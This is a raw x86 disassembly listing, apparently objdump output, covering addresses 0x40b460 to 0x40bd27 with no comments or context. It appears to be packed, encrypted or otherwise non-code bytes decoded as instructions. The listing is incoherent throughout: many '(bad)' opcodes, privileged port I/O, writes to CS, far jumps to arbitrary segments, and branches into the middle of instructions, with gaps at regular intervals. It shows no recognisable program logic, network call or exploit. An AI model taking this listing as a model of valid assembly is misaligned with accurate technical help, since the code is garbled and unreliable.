  40b460:	fmul   QWORD PTR ds:0x90fd1ee5
  40b466:	cmc    
  40b467:	pushf  
  40b468:	xchg   DWORD PTR [ecx+0x1c],esp
  40b46b:	ja     0x40b455
  40b46d:	ror    DWORD PTR [eax],cl
  40b46f:	push   0x4c
  40b471:	cdq    
  40b472:	pop    eax
  40b473:	(bad)  
  40b474:	fcom   QWORD PTR [eax+0x61877cf5]
  40b47a:	sbb    al,0x5b
  40b47c:	call   0xbaabd54
  40b481:	cdq    
  40b482:	xor    DWORD PTR [eax+ebx*4],0x49310b0b
  40b489:	push   ebx
  40b48a:	add    eax,0xe50ddce9
  40b48f:	push   0xffffffeb
  40b491:	js     0x40b489
  40b493:	xor    al,0x94
  40b495:	ins    BYTE PTR es:[edi],dx
  40b496:	ret    
  40b497:	and    ah,BYTE PTR gs:[edx+0x2]
  40b49b:	test   eax,0xabbf989c
	...
  40b4b4:	lahf   
  40b4b5:	xchg   esp,eax
  40b4b6:	cmc    
  40b4b7:	adc    al,0x94
  40b4b9:	ins    BYTE PTR es:[edi],dx
  40b4ba:	mov    ah,0x47
  40b4bc:	add    ah,BYTE PTR [edx+0x2]
  40b4bf:	test   eax,0xbf9863
  40b4c4:	aaa    
  40b4c5:	test   DWORD PTR [eax],ecx
  40b4c7:	(bad)  
  40b4c8:	fcom   DWORD PTR [eax+0x6cb575f5]
  40b4ce:	int    0xfd
  40b4d0:	bound  ebp,QWORD PTR [edx+0x3]
  40b4d3:	shr    al,0x60
  40b4d6:	rol    edx,0xc5
  40b4d9:	xchg   esp,eax
  40b4da:	pusha  
  40b4db:	add    ch,0xd7
  40b4de:	or     BYTE PTR [eax-0x4c],ch
  40b4e1:	hlt    
  40b4e2:	inc    edi
  40b4e3:	add    BYTE PTR ds:0x62ff9aa5,bh
  40b4e9:	mov    cs,eax
  40b4eb:	jne    0x40b49f
  40b4ed:	in     al,dx
  40b4ee:	mov    ah,BYTE PTR [eax-0x1c]
  40b4f1:	xchg   esp,eax
  40b4f2:	pusha  
  40b4f3:	mov    ds:0xe808d952,eax
  40b4f8:	add    BYTE PTR [esi],0xf7
  40b4fb:	jmp    FWORD PTR [esi+0x54]
  40b4fe:	pop    es
  40b4ff:	test   BYTE PTR [eax-0x1ffff768],ch
  40b505:	aam    0xf4
  40b507:	push   eax
  40b508:	(bad)  
  40b509:	lock add al,0xff
  40b50c:	cmp    BYTE PTR [esi],dl
  40b50e:	push   esi
  40b50f:	inc    ecx
  40b510:	gs adc ecx,edx
  40b513:	or     BYTE PTR [esi],bh
  40b515:	push   esp
  40b516:	pop    es
  40b517:	test   DWORD PTR [eax],eax
	...
  40b529:	add    BYTE PTR [eax],al
  40b52b:	add    BYTE PTR [eax],dl
  40b52d:	xchg   esp,eax
  40b52e:	or     BYTE PTR [eax],al
  40b530:	iret   
  40b531:	cwde   
  40b532:	add    DWORD PTR [ebp+0x5d],0xffffffc9
  40b536:	(bad)  
  40b537:	(bad)  
  40b538:	mov    ebp,0x3541677d
  40b53d:	imul   edi,DWORD PTR [ebp-0x4],0x60828fe2
  40b544:	fs cwde 
  40b546:	mov    esp,eax
  40b548:	or     DWORD PTR [ebp+0x18680fc8],ecx
  40b54e:	or     DWORD PTR [eax],eax
  40b550:	mov    WORD PTR [ebp-0x3],gs
  40b553:	je     0x40b549
  40b555:	push   cs
  40b556:	push   es
  40b557:	mov    gs,WORD PTR [esp+ebp*4+0xc]
  40b55b:	or     eax,0x79
  40b55e:	mov    edi,esi
  40b560:	jo     0x40b5c3
  40b562:	imul   eax
  40b564:	data16 ins BYTE PTR es:[edi],dx
  40b566:	or     al,BYTE PTR [eax]
  40b568:	sbb    DWORD PTR [ecx],esi
  40b56a:	out    0x4f,al
  40b56c:	ss ins DWORD PTR es:[edi],dx
  40b56e:	std    
  40b56f:	je     0x40b525
  40b571:	aad    0x18
  40b573:	push   DWORD PTR [ebx-0x64400032]
  40b579:	icebp  
  40b57a:	dec    ebx
  40b57b:	add    DWORD PTR [ebp+ebp*2+0x6da07c89],ecx
  40b582:	or     eax,0xa6c4984
  40b587:	add    BYTE PTR [esi*2+0x41080f0a],cl
  40b58e:	or     eax,DWORD PTR [eax]
	...
  40b5a4:	mov    WORD PTR ds:0x2b785481,ds
  40b5aa:	pop    eax
  40b5ab:	call   0xff3ca468
  40b5b0:	(bad)  
  40b5b1:	in     al,0x35
  40b5b3:	call   0xff269613
  40b5b8:	fst    DWORD PTR [ebp-0x112017a6]
  40b5be:	cld    
  40b5bf:	dec    BYTE PTR [ebx-0x48]
  40b5c2:	cld    
  40b5c3:	(bad)  
  40b5c4:	cmp    ebp,DWORD PTR [ebp+0xa]
  40b5c7:	(bad)  
  40b5c8:	leave  
  40b5c9:	and    DWORD PTR [edx],ecx
  40b5cb:	add    BYTE PTR [ebp+ebp*2-0x32f9c377],cl
  40b5d2:	dec    ecx
  40b5d3:	add    BYTE PTR [eax+eiz*4-0x340397a6],cl
  40b5da:	dec    ecx
  40b5db:	add    ah,dh
  40b5dd:	xchg   ebx,eax
  40b5de:	imul   esi,DWORD PTR [edx-0x74],0x1c6c2f94
  40b5e5:	cmc    
  40b5e6:	and    BYTE PTR [ebx+esi*8],al
  40b5e9:	call   0xe3aea175
  40b5ee:	fild   WORD PTR [ebx]
  40b5f0:	xchg   edi,eax
  40b5f1:	push   esp
  40b5f2:	cld    
  40b5f3:	sbb    esp,DWORD PTR [edi+eax*1+0x1]
  40b5f7:	inc    ebx
  40b5f8:	mov    WORD PTR [esi+eax*2+0x72],gs
  40b5fc:	mov    WORD PTR [edi+ebp*4-0x5f0ae495],ss
  40b603:	add    edi,DWORD PTR [ebx+0xeb47e8]
	...
  40b619:	add    BYTE PTR [eax],al
  40b61b:	add    BYTE PTR [ecx-0x1d],cl
  40b61e:	fild   WORD PTR [ebx]
  40b620:	xchg   edi,eax
  40b621:	push   esp
  40b622:	mov    ah,0x4b
  40b624:	xor    al,0xff
  40b626:	rol    BYTE PTR [edx-0x74],0x6c
  40b62a:	bound  esi,QWORD PTR [edx-0x74]
  40b62d:	xchg   esp,eax
  40b62e:	(bad)  
  40b62f:	imul   ebp,DWORD PTR [ebx],0xfffffff4
  40b632:	mov    al,ds:0x17e88303
  40b637:	jmp    0x40b5de
  40b639:	loope  0x40b61a
  40b63b:	add    esp,DWORD PTR [edi-0x51]
  40b63e:	bound  esi,QWORD PTR [esi]
  40b640:	push   es
  40b641:	cmc    
  40b642:	mov    al,ds:0xe9e78d03
  40b647:	imul   esp,DWORD PTR [esp+esi*8],0xffffffa0
  40b64b:	add    esp,DWORD PTR [esi+edi*4+0x70]
  40b64f:	add    ecx,DWORD PTR [esp+eax*8-0x2c5363a9]
  40b656:	fcomip st,st(2)
  40b658:	shr    BYTE PTR [eax+ecx*8+0xb],0xbf
  40b65d:	xchg   esp,eax
  40b65e:	(bad)  
  40b660:	xchg   esi,eax
  40b661:	adc    DWORD PTR ds:0xdfd3c38e,ecx
  40b667:	add    eax,0x20892a1
  40b66c:	dec    eax
  40b66d:	mov    ecx,eax
  40b66f:	xor    al,0x6e
  40b671:	cmovl  ebx,DWORD PTR [ebp-0x61f815a8]
  40b678:	jne    0x40b6d6
  40b67a:	loope  0x40b658
  40b67c:	std    
  40b67d:	pop    esi
  40b67e:	test   BYTE PTR [esi+0x0],0x0
	...
  40b691:	add    BYTE PTR [eax],al
  40b693:	add    BYTE PTR [ebp+0x68],ah
  40b696:	pop    ecx
  40b697:	xchg   ecx,eax
  40b698:	scas   eax,DWORD PTR es:[edi]
  40b699:	pop    edi
  40b69a:	idiv   BYTE PTR [esi+0x59]
  40b69d:	fdivr  st,st(0)
  40b69f:	fs inc ebp
  40b6a1:	push   0x5d920359
  40b6a6:	jl     0x40b709
  40b6a8:	loopne 0x40b724
  40b6aa:	neg    BYTE PTR [esi-0x41]
  40b6ad:	pop    esi
  40b6ae:	jl     0x40b70d
  40b6b0:	pop    eax
  40b6b1:	ins    BYTE PTR es:[edi],dx
  40b6b2:	sbb    al,0x4c
  40b6b4:	lahf   
  40b6b5:	pop    esi
  40b6b6:	sub    BYTE PTR [ebx+eax*8-0x6fae8bee],0xe8
  40b6be:	cmp    al,0x6a
  40b6c0:	sbb    eax,0xadb50970
  40b6c5:	in     al,dx
  40b6c6:	or     cl,ch
  40b6c8:	outs   dx,BYTE PTR ds:[esi]
  40b6c9:	pop    ds
  40b6ca:	not    BYTE PTR [edi+esi*2+0x7f6bc775]
  40b6d1:	pop    esi
  40b6d2:	not    BYTE PTR [edi+eax*2+0x47f17c5e]
  40b6d9:	mov    eax,0x5e5efe89
  40b6de:	jl     0x40b6d9
  40b6e0:	pop    esi
  40b6e1:	call   0x11dab7e6
  40b6e6:	mul    dh
  40b6e8:	ds call 0x8cf595d2
  40b6ee:	loopne 0x40b6d6
  40b6f0:	or     bl,BYTE PTR [esi-0xa]
  40b6f3:	into   
  40b6f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6f5:	fs loope 0x40b6f8
	...
  40b70c:	loope  0x40b719
  40b70e:	idiv   edi
  40b710:	fcmovu st,st(3)
  40b712:	in     al,0xe8
  40b714:	dec    ecx
  40b715:	or     al,0xf7
  40b717:	(bad)  
  40b718:	cmp    bl,ah
  40b71a:	loopne 0x40b704
  40b71c:	adc    DWORD PTR [edi+esi*8],ecx
  40b71f:	call   FWORD PTR [ecx+edx*1]
  40b722:	hlt    
  40b723:	call   FWORD PTR [edx]
  40b725:	bound  edi,QWORD PTR [ebp-0x4]
  40b728:	sbb    bh,BYTE PTR [esi+ecx*4+0x60]
  40b72c:	mov    ah,0x98
  40b72e:	mov    esp,eax
  40b730:	icebp  
  40b731:	cmp    BYTE PTR [ecx-0x3e9da504],cl
  40b737:	ret    0x90e5
  40b73a:	pop    ebx
  40b73b:	mov    ebx,DWORD PTR [ecx-0x3a]
  40b73e:	bound  eax,QWORD PTR [eax]
  40b740:	pop    edx
  40b741:	fadd   QWORD PTR [eax]
  40b743:	call   0x379746
  40b748:	cs dec ecx
  40b74a:	pop    ebx
  40b74b:	call   0x49986f
  40b750:	sahf   
  40b751:	push   eax
  40b752:	jp     0x40b76f
  40b754:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b755:	push   ebp
  40b756:	dec    esi
  40b757:	jmp    0x40b7c0
  40b759:	sbb    BYTE PTR [esi],bh
  40b75b:	or     eax,0x38888d21
  40b760:	jg     0x40b73f
  40b762:	or     eax,esi
  40b764:	gs cwde 
  40b766:	loope  0x40b76a
  40b768:	mov    cs,WORD PTR [eax+eax*2-0x1d1d49c5]
  40b76f:	mov    eax,DWORD PTR [eax]
	...
  40b781:	add    BYTE PTR [eax],al
  40b783:	add    BYTE PTR [esi+0x61c2bfca],ah
  40b789:	cwde   
  40b78a:	pop    ebx
  40b78b:	mov    ecx,DWORD PTR [ecx+0x12]
  40b78e:	retf   0x82b4
  40b791:	gs jge 0x40b7a0
  40b794:	pop    ebp
  40b795:	lds    eax,FWORD PTR [edx-0xbbd7301]
  40b79b:	mov    edi,0xc95970a1
  40b7a0:	dec    esi
  40b7a1:	ds or  bh,bh
  40b7a4:	mov    eax,ds:0xe04dd269
  40b7a9:	and    bh,al
  40b7ab:	or     cl,ah
  40b7ad:	mov    eax,ds:0x2fd55f0d
  40b7b2:	sbb    eax,0x1080fb00
  40b7b7:	(bad)  
  40b7b8:	jns    0x40b817
  40b7ba:	rcl    BYTE PTR [edi+eiz*8+0xa],cl
  40b7be:	clc    
  40b7bf:	mov    WORD PTR [ecx-0x23],cs
  40b7c2:	pop    esp
  40b7c3:	jmp    DWORD PTR [ecx+0x69]
  40b7c6:	shl    cl,cl
  40b7c8:	push   es
  40b7c9:	jecxz  0x40b7c2
  40b7cb:	or     cl,ah
  40b7cd:	cmp    cl,BYTE PTR [esi+0xa6d8f07]
  40b7d3:	inc    DWORD PTR [ecx-0x47]
  40b7d6:	div    DWORD PTR [esp+esi*4-0x2b]
  40b7da:	mov    cl,0x8f
  40b7dc:	stos   DWORD PTR es:[edi],eax
  40b7dd:	retf   0xbff3
  40b7e0:	xchg   ebx,eax
  40b7e1:	jmp    0x6dccb9ce
  40b7e6:	jae    0x40b82c
	...
  40b7fc:	mov    al,ds:0xcb7fe4f6
  40b801:	ins    DWORD PTR es:[edi],dx
  40b802:	or     DWORD PTR [edx+ebx*2-0x1cfff591],eax
  40b809:	test   DWORD PTR [ebp-0x1],ebx
  40b80c:	jae    0x40b790
  40b80e:	jno    0x40b854
  40b810:	cmp    al,0x8a
  40b812:	jge    0x40b7e4
  40b814:	hlt    
  40b815:	bound  ebp,QWORD PTR [ebx+0x41]
  40b818:	mov    WORD PTR [ebp+0x6d8c706b],es
  40b81e:	pop    edx
  40b81f:	inc    ecx
  40b821:	jge    0x40b877
  40b823:	adc    ebp,DWORD PTR [ebp+0x24042094]
  40b829:	ror    DWORD PTR [edi+0x4],0x8c
  40b82d:	(bad)  
  40b82e:	fidiv  WORD PTR [esi+0x3c]
  40b831:	in     al,dx
  40b832:	(bad)  
  40b833:	(bad)  
  40b834:	int    0x94
  40b836:	xlat   BYTE PTR ds:[ebx]
  40b837:	dec    eax
  40b838:	pushf  
  40b839:	xchg   esp,eax
  40b83a:	fisttp WORD PTR [ebp-0x4b]
  40b83d:	(bad)  
  40b83e:	lahf   
  40b83f:	ja     0x40b7d9
  40b841:	(bad)  
  40b842:	xchg   ecx,eax
  40b843:	ja     0x40b7d9
  40b845:	(bad)  
  40b846:	mov    eax,0xe20e1100
  40b84b:	add    ecx,DWORD PTR [edi+ecx*4+0x539576a8]
  40b852:	sub    eax,0xdf948cb8
  40b857:	add    esp,edi
  40b859:	xchg   edx,eax
  40b85a:	scas   al,BYTE PTR es:[edi]
  40b85b:	inc    esi
  40b85c:	sbb    BYTE PTR [edi+ebx*8+0x3],dl
	...
  40b873:	add    BYTE PTR [eax+ebx*2+0x5b04c3b3],cl
  40b87a:	outs   dx,DWORD PTR ds:[esi]
  40b87b:	lock mov edx,0x8b2b8665
  40b881:	loope  0x40b862
  40b883:	enter  0x6c50,0xe0
  40b887:	add    ecx,DWORD PTR [esp+edx*4-0x7473cfa1]
  40b88e:	imul   ecx,DWORD PTR [ebx-0x72],0xffffff94
  40b892:	fistp  WORD PTR [eax+0x74]
  40b895:	cmp    ah,BYTE PTR [esi]
  40b897:	lock or BYTE PTR [eiz*4+0x17d80ebf],0x3
  40b8a0:	stc    
  40b8a1:	mov    bl,0x87
  40b8a3:	loope  0x40b87f
  40b8a5:	rcr    edi,cl
  40b8a7:	lock fmul DWORD PTR [eax+0x18]
  40b8ab:	call   0xfd204d9a
  40b8b0:	adc    ecx,DWORD PTR [edx-0x696693f8]
  40b8b6:	or     cl,ch
  40b8b8:	push   esp
  40b8b9:	shl    eax,1
  40b8bb:	call   0xd0494d4f
  40b8c0:	xor    dl,BYTE PTR [eax+ecx*1-0x1f26f117]
  40b8c7:	call   0x44c04270
  40b8cc:	and    al,0x53
  40b8ce:	dec    esp
  40b8cf:	ror    DWORD PTR [esi-0x1716f76c],1
  40b8d5:	push   esi
  40b8d6:	or     cl,ch
	...
  40b8ec:	(bad)  
  40b8ed:	adc    eax,0xdf8e9174
  40b8f2:	add    eax,0xce747d70
  40b8f7:	sub    al,0xc8
  40b8f9:	xchg   esi,eax
  40b8fa:	or     cl,ch
  40b8fc:	(bad)  
  40b8fd:	imul   esp,DWORD PTR [edi-0x766b7018],0xfffffffc
  40b904:	mov    bh,0x96
  40b906:	jnp    0x40b8ee
  40b908:	dec    eax
  40b909:	fcom   st(4)
  40b90b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b90c:	push   ebp
  40b90d:	ins    BYTE PTR es:[edi],dx
  40b90e:	or     eax,0xdf948fe9
  40b913:	or     BYTE PTR [ecx+0x1d6a0894],0x6c
  40b91a:	or     eax,0x740ca2d4
  40b91f:	and    ebx,edx
  40b921:	shl    al,1
  40b923:	in     al,0x8f
  40b925:	xchg   esp,eax
  40b926:	or     BYTE PTR [eax+0x14],al
  40b929:	xchg   esp,eax
  40b92a:	or     cl,ch
  40b92c:	push   cs
  40b92d:	fsub   st,st(0)
  40b92f:	in     al,dx
  40b930:	jp     0x40b942
  40b932:	fs call 0x94c04dc7
  40b938:	inc    ebx
  40b939:	push   ss
  40b93a:	je     0x40b991
  40b93c:	mov    al,ah
  40b93e:	(bad)  
  40b93f:	jmp    FWORD PTR [edx+0x6502e0cb]
  40b945:	xchg   ebp,eax
  40b946:	or     bl,ch
  40b948:	cmp    dl,BYTE PTR [edx+0x4d]
  40b94b:	call   0x494e7b
	...
  40b964:	jmp    0x895:0x2500c8cb
  40b96b:	(bad)  
  40b96c:	js     0x40b986
  40b96e:	idiv   bh
  40b970:	xor    eax,0xe945cd95
  40b975:	xchg   esp,eax
  40b976:	or     BYTE PTR [eax],al
  40b978:	and    eax,0xf5bc4d52
  40b97d:	xchg   esp,eax
  40b97e:	or     BYTE PTR [eax],al
  40b980:	sub    cl,ah
  40b982:	mov    al,0x0
  40b984:	in     eax,0x94
  40b986:	or     bh,bh
  40b988:	cwde   
  40b989:	ins    BYTE PTR es:[edi],dx
  40b98a:	out    dx,al
  40b98b:	adc    eax,DWORD PTR [ebx]
  40b98d:	push   0xfffffff7
  40b98f:	mov    DWORD PTR [eax+0x3175f750],ebp
  40b995:	cmp    eax,0x6a52fe0e
  40b99a:	add    DWORD PTR [ebp-0x13],0xdd47d69
  40b9a1:	fs cmc 
  40b9a3:	push   DWORD PTR [edx]
  40b9a5:	fmul   DWORD PTR [esp+eax*8+0x26]
  40b9a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9aa:	xchg   edx,eax
  40b9ab:	pusha  
  40b9ac:	hlt    
  40b9ad:	xchg   esp,eax
  40b9ae:	or     BYTE PTR [ebp-0x19],dh
  40b9b1:	mov    esp,0x94e46198
  40b9b6:	loopne 0x40b93f
  40b9b8:	ret    
  40b9b9:	xchg   esp,eax
  40b9ba:	or     BYTE PTR [eax+0x4d],dl
  40b9bd:	add    al,0x69
  40b9bf:	inc    ecx
  40b9c0:	jne    0x40ba29
  40b9c2:	jge    0x40b984
  40b9c4:	popf   
  40b9c5:	jbe    0x40ba3f
	...
  40b9db:	add    BYTE PTR [ebp+0x5b],ah
  40b9de:	mov    dh,0x74
  40b9e0:	mov    WORD PTR [ebp+0x52],fs
  40b9e3:	xchg   edi,eax
  40b9e4:	in     eax,dx
  40b9e5:	sub    al,0xa
  40b9e7:	call   0x4ab9d3
  40b9ec:	mov    esp,0xcd609f05
  40b9f1:	ins    DWORD PTR es:[edi],dx
  40b9f2:	out    0x74,eax
  40b9f4:	dec    esp
  40b9f5:	xchg   esi,eax
  40b9f6:	sbb    dh,BYTE PTR [eax-0x74]
  40b9f9:	ins    DWORD PTR es:[edi],dx
  40b9fa:	icebp  
  40b9fb:	mov    edi,0x9f5476b8
  40ba00:	lods   eax,DWORD PTR ds:[esi]
  40ba01:	lods   al,BYTE PTR ds:[esi]
  40ba02:	or     al,0xe8
  40ba04:	rcl    DWORD PTR [edi-0x3a43fff4],cl
  40ba0a:	and    DWORD PTR [eax-0x33],0x6d
  40ba0e:	in     eax,0x74
  40ba10:	int3   
  40ba11:	push   ebp
  40ba12:	cld    
  40ba13:	outs   dx,BYTE PTR ds:[esi]
  40ba14:	mov    WORD PTR [ebp-0x2f],gs
  40ba17:	and    al,0xf
  40ba19:	jno    0x40b99b
  40ba1b:	pop    edi
  40ba1c:	dec    ebp
  40ba1d:	ins    DWORD PTR es:[edi],dx
  40ba1e:	or     esi,DWORD PTR [ebp-0x7a]
  40ba21:	xchg   ebp,eax
  40ba22:	xchg   esp,eax
  40ba23:	pusha  
  40ba24:	dec    ebp
  40ba25:	ins    DWORD PTR es:[edi],dx
  40ba26:	shr    BYTE PTR [ebx],cl
  40ba28:	push   0x6d
  40ba2a:	or     dl,BYTE PTR [eax+0x64]
  40ba2d:	lds    ebp,FWORD PTR [ecx+0x41]
  40ba30:	mov    esi,ds
  40ba32:	jge    0x40b9f4
  40ba34:	mov    ah,0x1
  40ba36:	push   esp
  40ba37:	add    BYTE PTR [edx+eax*8+0x62cc2b0a],cl
  40ba3e:	retf   0x74
	...
  40ba51:	add    BYTE PTR [eax],al
  40ba53:	add    BYTE PTR [esi],ch
  40ba55:	mov    esi,0x37b4c87d
  40ba5a:	push   esp
  40ba5b:	add    BYTE PTR [ebp+edi*8-0x3a3b8b1c],cl
  40ba62:	out    dx,eax
  40ba63:	stc    
  40ba64:	mov    ebx,DWORD PTR [esi-0x59bfbb8f]
  40ba6a:	jge    0x40ba30
  40ba6c:	fs xchg esp,eax
  40ba6e:	sub    DWORD PTR [edi-0x74],ebx
  40ba71:	xchg   esp,eax
  40ba72:	scas   eax,DWORD PTR es:[edi]
  40ba73:	in     al,dx
  40ba74:	loopne 0x40bac6
  40ba76:	or     ch,dh
  40ba78:	fs push edi
  40ba7a:	pop    es
  40ba7b:	jnp    0x40ba4d
  40ba7d:	sbb    al,0x63
  40ba7f:	outs   dx,DWORD PTR ds:[esi]
  40ba80:	dec    esp
  40ba81:	xchg   esp,eax
  40ba82:	jnp    0x40babb
  40ba84:	psubusw mm6,QWORD PTR [edi]
  40ba87:	add    al,0xb8
  40ba89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba8a:	xchg   DWORD PTR [ebx],eax
  40ba8c:	mov    WORD PTR [edi-0x52],fs
  40ba8f:	in     al,dx
  40ba90:	mov    eax,0xaab3d78c
  40ba95:	push   edi
  40ba96:	fucomip st,st(4)
  40ba98:	cwde   
  40ba99:	push   esp
  40ba9a:	(bad)  
  40ba9b:	jbe    0x40ba21
  40ba9d:	ins    BYTE PTR es:[edi],dx
  40ba9e:	out    0x83,eax
  40baa0:	adc    dl,BYTE PTR [edi-0x49]
  40baa3:	jbe    0x40baed
  40baa5:	push   edi
  40baa6:	xor    eax,0x2757ebfc
  40baab:	in     eax,dx
  40baac:	cli    
  40baad:	push   esi
  40baae:	adc    eax,0xf7e0f2ac
  40bab3:	fcmovnu st,st(4)
  40bab5:	(bad)  
  40bab6:	sahf   
  40bab7:	in     al,dx
	...
  40bacc:	loop   0x40baae
  40bace:	lahf   
  40bacf:	fcmovnb st,st(1)
  40bad1:	adc    DWORD PTR [edi-0x481f2d14],ecx
  40bad7:	fcmovnu st,st(1)
  40bad9:	adc    DWORD PTR [edi-0x14],edi
  40badc:	ret    0xabe0
  40badf:	fcmovnbe st,st(1)
  40bae1:	adc    DWORD PTR [edi-0x14],ebp
  40bae4:	mov    dl,0xe0
  40bae6:	xchg   ebx,eax
  40bae7:	fucomi st,st(1)
  40bae9:	adc    DWORD PTR [edi-0x14],ebx
  40baec:	mov    ds:0xe1db97e0,al
  40baf1:	adc    DWORD PTR [edi-0x14],ecx
  40baf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40baf5:	mov    BYTE PTR [edx+0x6e],ah
  40baf8:	je     0x40ba89
  40bafa:	or     BYTE PTR [eax+ecx*4-0x72beb3b3],bh
  40bb01:	xchg   esp,eax
  40bb02:	or     cl,ch
  40bb04:	or     al,0xd9
  40bb06:	loopne 0x40baf1
  40bb08:	jecxz  0x40baae
  40bb0a:	pusha  
  40bb0b:	pop    es
  40bb0c:	mov    al,ds:0xe20e08d3
  40bb11:	dec    eax
  40bb12:	loope  0x40bb25
  40bb14:	mov    dl,0x94
  40bb16:	or     dl,dh
  40bb18:	dec    edi
  40bb19:	loope  0x40bb28
  40bb1b:	cs retf 0x86c
  40bb1f:	jmp    0x75a14fb3
  40bb24:	test   eax,0x9dde08d3
  40bb29:	dec    eax
  40bb2a:	loope  0x40bae5
  40bb2c:	lds    edx,FWORD PTR [eax+ecx*1+0xe2]
	...
  40bb43:	add    BYTE PTR [edi-0x1f],cl
  40bb46:	or     eax,0xb6ccdae
  40bb4b:	jmp    0x3d364fdf
  40bb50:	inc    esp
  40bb51:	outs   dx,BYTE PTR ds:[esi]
  40bb52:	pusha  
  40bb53:	imul   esp,edi,0x56
  40bb56:	cmc    
  40bb57:	fcmove st,st(7)
  40bb59:	sbb    al,0xf6
  40bb5b:	sahf   
  40bb5c:	not    DWORD PTR [esi-0x5]
  40bb5f:	inc    edi
  40bb60:	mov    al,0x8d
  40bb62:	add    eax,0xf6590764
  40bb67:	xchg   bh,ah
  40bb69:	loopne 0x40bb43
  40bb6b:	xchg   ecx,eax
  40bb6c:	xchg   DWORD PTR [edx],edx
  40bb6e:	div    BYTE PTR [esi-0x49]
  40bb71:	loopne 0x40bb57
  40bb73:	or     DWORD PTR [edi+0x12],0xd03566f6
  40bb7a:	clc    
  40bb7b:	mov    ecx,0x5680dfc7
  40bb80:	mov    bh,0x6d
  40bb82:	in     eax,0x51
  40bb84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb85:	push   esi
  40bb86:	push   esi
  40bb87:	add    BYTE PTR [esi+ecx*2+0x6],bl
  40bb8b:	add    BYTE PTR [eax],ah
  40bb8d:	(bad)  
  40bb8e:	loope  0x40bb11
  40bb90:	mov    cl,0x24
  40bb92:	hlt    
  40bb93:	jmp    FWORD PTR [edx-0x544772af]
  40bb99:	imul   esi,edi,0x8917500
  40bb9f:	mov    esi,DWORD PTR [eax]
  40bba1:	test   DWORD PTR [ecx],eax
  40bba3:	rol    BYTE PTR [ecx],0x94
  40bba6:	mov    BYTE PTR [eax],bh
	...
  40bbbc:	gs in  al,0xb
  40bbbf:	jmp    0x494ab5
  40bbc4:	cmp    ah,ah
  40bbc6:	sbb    al,0xe8
  40bbc8:	sbb    eax,0x3efff6dc
  40bbcd:	push   ecx
  40bbce:	jge    0x40bbdf
  40bbd0:	mov    ebp,0x3541475d
  40bbd5:	push   0x7d
  40bbd7:	adc    al,0x4d
  40bbd9:	add    ecx,DWORD PTR [ebp+0x5364aff]
  40bbdf:	push   0x4799cd
  40bbe4:	cmp    ah,ah
  40bbe6:	sbb    al,0xe8
  40bbe8:	jb     0x40bbfe
  40bbea:	idiv   edi
  40bbec:	jl     0x40bc02
  40bbee:	mov    esi,0x6e6a0afe
  40bbf3:	ds hlt 
  40bbf5:	nop
  40bbf6:	or     BYTE PTR [ebp-0xbb090],cl
  40bbfc:	or     al,cl
  40bbfe:	loopne 0x40bbff
  40bc00:	xor    al,0x6a
  40bc02:	test   DWORD PTR [ebp-0xbb0d0],0xb5f5c12a
  40bc0c:	in     eax,dx
  40bc0d:	push   0xfffffff7
  40bc0f:	(bad)  
  40bc10:	cmp    eax,0x8c0063a0
  40bc15:	imul   esi,DWORD PTR [ebp-0x7c],0xffffffd8
  40bc19:	(bad)  
  40bc1d:	pop    esi
  40bc1e:	jbe    0x40bc05
	...
  40bc34:	lea    edi,ds:0x80198d0a
  40bc3a:	(bad)  
  40bc3c:	jnp    0x40bbc9
  40bc3e:	or     edx,DWORD PTR [eax]
  40bc40:	mov    WORD PTR ds:0xbf100f0a,?
  40bc46:	or     DWORD PTR [eax],eax
  40bc48:	mov    WORD PTR [eax+0x15bc2c4b],?
  40bc4e:	ror    BYTE PTR [esi-0x33],1
  40bc51:	cmp    eax,0x3db909d2
  40bc56:	or     cl,BYTE PTR [ebx]
  40bc58:	dec    esp
  40bc59:	ror    DWORD PTR [eax],1
  40bc5b:	jmp    0x4af974
  40bc60:	add    ecx,edx
  40bc62:	into   
  40bc63:	std    
  40bc64:	sub    esi,DWORD PTR [ebx+0x7e]
  40bc67:	inc    ecx
  40bc68:	jo     0x40bbf7
  40bc6a:	push   esp
  40bc6b:	lock retf 
  40bc6d:	jl     0x40bc7b
  40bc6f:	call   0x4da695
  40bc74:	xchg   edi,eax
  40bc75:	std    
  40bc76:	gs add eax,0x986f5
  40bc7c:	mov    WORD PTR [edx],es
  40bc7e:	data16 adc al,0xe4
  40bc81:	icebp  
  40bc82:	jo     0x40bc82
  40bc84:	jmp    0x40bccc
  40bc86:	retf   0x9374
  40bc89:	xchg   ebp,eax
  40bc8a:	pop    DWORD PTR [edi+0x4d]
  40bc8d:	cmp    eax,0x257874e1
  40bc92:	inc    DWORD PTR [ebx+0x9d3d2cb]
	...
  40bcac:	ss cmp eax,0x15a074e1
  40bcb2:	jmp    0x40bc37
  40bcb4:	mov    bl,0x94
  40bcb6:	outs   dx,BYTE PTR ds:[esi]
  40bcb7:	ja     0x40bcb9
  40bcb9:	push   edi
  40bcba:	push   esi
  40bcbb:	jmp    0x17f2de62
  40bcc0:	ds in  al,0x47
  40bcc3:	push   ds
  40bcc4:	or     DWORD PTR [edi+ecx*2+0x54],edx
  40bcc8:	fcom   QWORD PTR [ebx-0x43]
  40bccb:	adc    eax,DWORD PTR [ebx+0xe8ebc9]
  40bcd1:	popf   
  40bcd2:	inc    edi
  40bcd3:	cmc    
  40bcd4:	jno    0x40bd29
  40bcd6:	das    
  40bcd7:	fsubr  QWORD PTR [ebp+0x74e91715]
  40bcdd:	and    al,0x3
  40bce0:	mov    WORD PTR [ecx],fs
  40bce2:	mov    ds:0x34190517,al
  40bce7:	jmp    0xb426:0x2763534a
  40bcee:	mov    al,ds:0xadc98f03
  40bcf3:	pop    ebx
  40bcf4:	pop    ebp
  40bcf5:	mov    ah,0x20
  40bcf7:	add    al,0x2b
  40bcf9:	or     DWORD PTR [ecx+ebp*8+0x58c85322],ebx
  40bd00:	test   eax,0xd3fcdf94
  40bd05:	(bad)  
  40bd06:	sbb    al,0x5c
  40bd08:	cmp    ebx,esp
  40bd0a:	and    BYTE PTR [ebx+eax*1],al
  40bd0d:	leave  
  40bd0e:	rcr    ebx,cl
	...
  40bd24:	add    al,0x18
  40bd26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd27:	call   0xe994c61e
